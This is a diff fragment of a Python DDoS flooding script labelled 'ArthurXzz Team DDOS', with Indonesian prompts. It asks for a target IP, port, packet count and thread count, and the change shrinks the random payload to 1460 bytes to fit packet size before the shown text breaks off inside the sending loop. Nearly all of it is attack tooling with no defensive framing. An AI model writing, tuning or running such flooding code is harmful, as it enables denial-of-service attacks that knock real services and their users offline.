@@ -11,11 +11,11 @@ print("ArthurXzz Team DDOS")
 print("AUTO TEMBUS")
 ip = str(input(" Ip Target: "))
 port = int(input(" Port Target: "))
-choice = str(input(" Gas Ddos Ga?(y/n): "))
+choice = str(input(" Apakah Siap Mengirim Nuklir?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
-  data = random._urandom(12345)
+  data = random._urandom(1460)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
